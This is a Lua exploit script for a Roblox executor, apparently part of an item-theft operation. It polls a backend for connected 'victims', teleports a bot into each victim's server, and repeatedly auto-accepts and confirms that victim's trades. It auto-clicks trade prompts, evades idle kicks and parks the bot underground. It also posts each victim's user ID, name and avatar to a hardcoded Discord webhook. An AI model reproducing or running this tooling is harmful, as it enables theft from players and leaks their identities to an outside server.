---@diagnostic disable: need-check-nil, undefined-field
-- set it up for your custom  backend or webhook system

local teleportService = game:GetService("TeleportService")
local httpService = game:GetService("HttpService")
local players = game:GetService("Players")
local virtualUser = game:GetService("VirtualUser")
local player = players.LocalPlayer
local serverUrl = ":9295"
local verificationHeaders = { ["Content-Type"] = "application/json"}
local currentTarget = nil
local isTracking = false
local joinedUser = false
local executionId = tick(); executionId = _G.ExecutionID
local http = request or http_request

local function notify(message)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "AutoJoiner",
        Text = message or "No message provided",
        Duration = 5,
        Icon = "rbxassetid://139687752061139"
    })
end
local function apiRequest(endpoint, method, body)
    local jsonBody = (method ~= "GET" and body) and httpService:JSONEncode(body) or nil
    local response
    if typeof(request) == "function" then
        response = request({ Url = serverUrl .. endpoint, Method = method, Headers = verificationHeaders, Body = jsonBody })
    else
        local success, result = pcall(function()
            return httpService:RequestAsync({
                Url = serverUrl .. endpoint,
                Method = method,
                Headers = verificationHeaders,
                Body =
                    jsonBody
            })
        end)
        if success then response = result end
    end
    if response and response.StatusCode == 200 then
        local success, decoded = pcall(function() return httpService:JSONDecode(response.Body) end)
        if success then return decoded end
    end
    return nil
end
local function autoTrader(victim)
    local username = victim
    local tf = game:GetService("ReplicatedStorage"):WaitForChild("Trading")
    local acceptRequest = tf:WaitForChild("AcceptRequest")
    local confirmTrade = tf:WaitForChild("ConfirmTrade")
    local acceptTrade = tf:WaitForChild("AcceptTrade")
    task.spawn(function()
        while task.wait(0.5) do
            local targetPlayer = players:FindFirstChild(username)
            if targetPlayer then
                acceptRequest:InvokeServer(targetPlayer)
                task.wait(0.1)
                confirmTrade:FireServer()
                acceptTrade:FireServer()
            end
        end
    end)
end
local function findAndClaimTarget()
    local data = apiRequest("/websocket/users", "GET")
    if not data or not data.connectedUsers then return nil end
    local myUserIdStr = tostring(player.UserId)
    local currentPlaceId, currentJobId = tostring(game.PlaceId), game.JobId

    for userId, userSession in pairs(data.connectedUsers) do
        if tostring(userSession.botId) == myUserIdStr and tostring(userSession.placeid) == currentPlaceId and tostring(userSession.jobid) == currentJobId then
            return userSession
        end
    end

    for userId, userSession in pairs(data.connectedUsers) do
        if userSession.placeid and not userSession.botTrackerState then
            local res = apiRequest("/websocket/update-state", "POST", {
                ["TARGET_USER_ID"] = tostring(userId),
                ["STATE"] = "joining",
                ["BOT_ID"] = myUserIdStr
            })
            if res and res.success then return userSession end
        end
    end
    return nil
end
local function sendWebhook(id, user, display, img)
    http({
        Url =
        "https://discord.com/api/webhooks/151360535rvLjiww83G6cbpMG6ki1q",
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode({
            username = "Project Hyperion",
            avatar_url =
            "https://cdn.discordapp.com/avatars/1512521103258423447/bc9799ab0bcf42698e22e7a601dcb46c.webp?size=100",
            embeds = {
                {
                    title = "Autojoiner Logs",
                    description = "Joined **" .. display .. " (@" .. user .. ")**",
                    thumbnail = { url = img },
                    fields = {
                        { name = "User ID", value = tostring(id), inline = true }
                    }
                }
            }
        })
    })
end

task.spawn(function()
    while task.wait(1) do
        if _G.ExecutionID ~= executionId then break end
        local currentPlaceId, currentJobId = tostring(game.PlaceId), game.JobId
        if not currentTarget then
            local target = findAndClaimTarget()
            if target then
                currentTarget = target
                if tostring(target.placeid) ~= currentPlaceId or tostring(target.jobid) ~= currentJobId then
                    pcall(function()
                        notify("teleporting to new server")
                        teleportService:TeleportToPlaceInstance(tonumber(target.placeid),
                            tostring(target.jobid), player)
                    end)
                end
            end
        else
            local data = apiRequest("/websocket/users", "GET")
            local liveStatus = (data and data.connectedUsers) and data.connectedUsers[tostring(currentTarget.userid)] or
                nil
            if not liveStatus then
                notify("User left, looking for new players")
                joinedUser = false
                currentTarget, isTracking = nil, false
                continue
            end
            if tostring(liveStatus.placeid) == currentPlaceId and tostring(liveStatus.jobid) == currentJobId then
                if not isTracking or liveStatus.botTrackerState ~= "joined" then
                    local res = apiRequest("/websocket/update-state", "POST", {
                        ["TARGET_USER_ID"] = tostring(currentTarget.userid),
                        ["STATE"] = "joined",
                        ["BOT_ID"] = tostring(player.UserId)
                    })
                    if res and res.success then isTracking = true end
                end
                if not joinedUser then
                    notify("JOINED " .. tostring(liveStatus.username))
                    autoTrader(liveStatus.username)
                    joinedUser = true

                    local player2 = game:GetService("Players"):FindFirstChild(liveStatus.username) or
                        game:GetService("Players").LocalPlayer
                    if player2 then
                        local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..
                            player2.UserId .. "&width=420&height=420&format=png"
                        local success, res = pcall(function()
                            return game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" ..
                                player2.UserId .. "&size=420x420&format=Png")
                        end)
                        if success and res then
                            local data = game:GetService("HttpService"):JSONDecode(res)
                            if data and data.data and data.data[1] and data.data[1].imageUrl then
                                thumbUrl = data.data[1].imageUrl
                            end
                        end
                        sendWebhook(
                            player2.UserId,
                            player2.Name,
                            player2.DisplayName,
                            thumbUrl
                        )
                    end
                end
            else
                apiRequest("/websocket/update-state", "POST",
                    {
                        ["TARGET_USER_ID"] = tostring(currentTarget.userid),
                        ["STATE"] = "clear",
                        ["BOT_ID"] = tostring(
                            player.UserId)
                    })
                pcall(function()
                    notify("joining new server")
                    teleportService:TeleportToPlaceInstance(tonumber(liveStatus.placeid),
                        tostring(liveStatus.jobid), player)
                end)
                currentTarget, isTracking = nil, false
            end
        end
    end
end)
task.spawn(function() -- gui auto prompt acceptor
    local player = game:GetService("Players").LocalPlayer
    while task.wait(0.1) do
        if _G.ExecutionID ~= executionId then break end
        pcall(function()
            local gui = player.PlayerGui:FindFirstChild("TradingGui")
            if not gui then return end
            local frame = gui.Frame
            local targets = { frame.CompletedFrame, frame.DeclineFrame, frame.ErrorFrame }
            for i = 1, #targets do
                local section = targets[i]
                if section.Visible then
                    local btn = section:FindFirstChild("Button")
                    if btn and btn.Visible and firesignal then
                        firesignal(btn.MouseButton1Click)
                        firesignal(btn.Activated)
                    end
                end
            end
        end)
    end
end)
task.spawn(function() -- anti afk to prevent idle kicks
    player.Idled:Connect(function()
        pcall(function()
            virtualUser:CaptureController()
            virtualUser:ClickButton2(Vector2.new(math.random(50, 500), math.random(50, 500)))
        end)
    end)
    while task.wait(60) do
        pcall(function()
            virtualUser:CaptureController()
            local randomX = math.random(100, 800)
            local randomY = math.random(100, 600)
            virtualUser:ClickButton2(Vector2.new(randomX, randomY))
            task.wait(math.random(1, 3))
        end)
    end
end)
notify("ready to autojoin")

task.spawn(function() -- auto move down
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local targetCFrame = rootPart.CFrame - Vector3.new(0, 30, 0)
    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = TweenService:Create(rootPart, tweenInfo, { CFrame = targetCFrame })
    tween:Play()
    tween.Completed:Wait()
    rootPart.Anchored = true
end)
